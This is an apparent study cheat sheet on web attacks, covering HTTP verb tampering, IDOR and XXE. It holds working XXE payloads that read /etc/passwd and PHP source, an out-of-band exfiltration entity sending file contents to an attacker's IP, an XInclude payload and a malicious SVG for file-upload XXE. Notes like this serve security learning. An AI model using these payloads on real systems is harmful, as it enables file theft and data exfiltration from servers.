## HTTP Verb Tampering

`HTTP Method`

- `HEAD`
- `PUT`
- `DELETE`
- `OPTIONS`
- `PATCH`

|**Command**|**Description**|
|---|---|
|`-X OPTIONS`|Set HTTP Method with Curl|

## IDOR

`Identify IDORS`

- In `URL parameters & APIs`
- In `AJAX Calls`
- By `understanding reference hashing/encoding`
- By `comparing user roles`

| **Command** | **Description**        |
| ----------- | ---------------------- |
| `md5sum`    | MD5 hash a string      |
| `base64`    | Base64 encode a string |

## XXE

| **Code**                                                                           | **Description**                                |
| ---------------------------------------------------------------------------------- | ---------------------------------------------- |
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">`                                | Define External Entity to a URL                |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                                        | Define External Entity to a file path          |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`        | Reading a file through a PHP error             |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">`  | Reading a file OOB exfiltration                |

to read /etc/passwd file + you need to specify the "company"
ENTITY in the xml 

<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&company;</productId><storeId>&company;</storeId></stockCheck>

like such 


XInclude payload -> when the xml ducoment is on the server side XInclude will parse the input as XML 

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

inject into a parameter (leave the spaces!)


XXE via file upload(image):

```<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>```

write this to a file and name it {whatever}.svg 
the result is saved in the uploaded image itself 